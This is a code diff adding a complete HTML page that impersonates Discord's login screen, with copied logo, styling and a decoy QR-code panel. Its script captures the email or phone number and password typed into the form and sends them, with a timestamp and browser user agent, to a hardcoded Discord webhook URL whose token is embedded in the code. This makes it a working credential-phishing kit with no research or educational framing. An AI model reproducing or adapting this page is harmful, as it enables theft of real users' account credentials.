@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+      background: #36393f;
+    }
+
+    /* Background image styling - FIXED */
+    .bg-image {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -2;
+      opacity: 0.4;
+    }
+
+    /* Overlay to improve readability */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: -1;
+    }
+
+    /* Top left logo */
+    .top-left-logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .logo-icon {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-icon svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    .logo-text {
+      color: white;
+      font-weight: 700;
+      font-size: 20px;
+      letter-spacing: -0.5px;
+    }
+
+    .login-page {
+      width: 100%;
+      max-width: 784px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .main {
+      width: 100%;
+    }
+
+    .authBox {
+      display: flex;
+      background: #36393f;
+      border-radius: 8px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+      overflow: hidden;
+    }
+
+    .main-form {
+      flex: 1;
+      padding: 32px;
+    }
+
+    .main-form-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .main-form-header h1 {
+      font-size: 24px;
+      line-height: 30px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .main-form-header p {
+      color: #b9bbbe;
+      font-size: 16px;
+      line-height: 20px;
+    }
+
+    .input-groups {
+      margin-bottom: 20px;
+    }
+
+    .email-wrapper,
+    .password-wrapper {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      color: #b9bbbe;
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      height: 40px;
+      border-radius: 3px;
+      border: 1px solid rgba(0, 0, 0, 0.3);
+      background-color: rgba(0, 0, 0, 0.1);
+      color: #dcddde;
+      outline: none;
+      font-size: 16px;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-color: #7289da;
+    }
+
+    .forgot-password {
+      margin-bottom: 20px;
+    }
+
+    .forgot-password a {
+      color: #00aff4;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    .login button {
+      width: 100%;
+      background-color: #5865f2;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      font-size: 16px;
+      font-weight: 500;
+      height: 44px;
+      cursor: pointer;
+      margin-bottom: 8px;
+      transition: background-color 0.2s;
+    }
+
+    .login button:hover {
+      background-color: #4752c4;
+    }
+
+    .small-register {
+      font-size: 14px;
+      color: #72767d;
+    }
+
+    .small-register a {
+      color: #00aff4;
+      text-decoration: none;
+      margin-left: 4px;
+    }
+
+    .small-register a:hover {
+      text-decoration: underline;
+    }
+
+    .right-section {
+      flex: 1;
+      background: #36393f;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+      text-align: center;
+    }
+
+    .login-container {
+      max-width: 100%;
+    }
+
+    .qr-code {
+      width: 176px;
+      height: 176px;
+      background-color: white;
+      margin: 0 auto 16px;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .qr-code img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .login-container h2 {
+      color: white;
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+
+    .login-container p {
+      color: #b9bbbe;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+
+    .login-container a {
+      color: #00aff4;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .login-container a:hover {
+      text-decoration: underline;
+    }
+
+    .webhook-status {
+      margin-top: 20px;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+      display: none;
+    }
+
+    .success {
+      background: #4CAF50;
+    }
+
+    .error {
+      background: #f44336;
+    }
+
+    .required {
+      color: #ed4245;
+    }
+
+    @media (max-width: 768px) {
+      .right-section {
+        display: none;
+      }
+      
+      .bg-image {
+        object-position: 65% center;
+      }
+      
+      .top-left-logo {
+        top: 15px;
+        left: 15px;
+      }
+      
+      .logo-text {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Background image - FIXED -->
+  <img src="https://i.redd.it/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png?width=1600&format=png&auto=webp&s=53d372d13bd1af47f24b8069e239aa3870fc6b78" alt="Background" class="bg-image">
+  
+  <!-- Dark overlay for better readability -->
+  <div class="overlay"></div>
+  
+  <!-- Top left logo -->
+  <div class="top-left-logo">
+    <div class="logo-icon">
+      <svg viewBox="0 0 127.14 96.36" fill="white">
+        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
+      </svg>
+    </div>
+    <div class="logo-text">Discord</div>
+  </div>
+  
+  <div class="login-page">
+    <main class="main">
+      <div class="authBox">
+        <div class="main-form">
+          <form id="loginForm">
+            <div class="input-groups">
+              <div class="main-form-header">
+                <h1>Welcome back!</h1>
+                <p>We're so exciting to see you again!</p>
+              </div>
+              <div class="email-wrapper">
+                <label for="emailORphone">EMAIL OR PHONE NUMBER <span class="required">*</span></label>
+                <input type="text" id="emailORphone" autocomplete="off" required>
+              </div>
+              <div class="password-wrapper">
+                <label for="password">PASSWORD <span class="required">*</span></label>
+                <input type="password" id="password" autocomplete="off" required>
+              </div>
+            </div>
+            <div class="forgot-password">
+              <a href="#">Forgot your password?</a>
+            </div>
+            <div class="login">
+              <button type="submit">Log In</button>
+            </div>
+            <div class="small-register">
+              <span>Need an account?</span>
+              <a href="#">Register</a>
+            </div>
+          </form>
+          
+          <div id="webhookStatus" class="webhook-status"></div>
+        </div>
+        
+        <div class="right-section">
+          <div class="login-container">
+            <div class="qr-code">
+              <img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcSOTquwqtD8TtlgFTu6vLmqJ1muUYMPjlfbvV3iJ_YsNM2VaUdy" alt="Discord QR Code">
+            </div>
+            <h2>Log in with QR Code</h2>
+            <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+            <a href="#">Or, sign in with passkey</a>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <script>
+    // Fixed webhook URL
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1417164666735431710/_O3iE6PQFePxdH96_5BEJX01qL0Zr5TtmPtfhmUvyU1r7MhELJElx7wBM3PP-0BVJyyG';
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('emailORphone').value;
+      const password = document.getElementById('password').value;
+      
+      try {
+        // Show loading state
+        const submitBtn = this.querySelector('button[type="submit"]');
+        submitBtn.textContent = 'Logging in...';
+        submitBtn.disabled = true;
+        
+        // Send data to webhook
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `New login attempt:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`,
+          }),
+        });
+        
+        if (response.ok) {
+          showStatus('Login information sent successfully!', 'success');
+          // Clear form
+          document.getElementById('emailORphone').value = '';
+          document.getElementById('password').value = '';
+        } else {
+          showStatus('Failed to send data. Please try again.', 'error');
+        }
+      } catch (error) {
+        showStatus('Error: ' + error.message, 'error');
+      } finally {
+        // Reset button state
+        const submitBtn = document.querySelector('#loginForm button[type="submit"]');
+        submitBtn.textContent = 'Log In';
+        submitBtn.disabled = false;
+      }
+    });
+
+    function showStatus(message, type) {
+      const statusEl = document.getElementById('webhookStatus');
+      statusEl.textContent = message;
+      statusEl.className = 'webhook-status ' + type;
+      statusEl.style.display = 'block';
+      
+      // Hide after 5 seconds
+      setTimeout(() => {
+        statusEl.style.display = 'none';
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
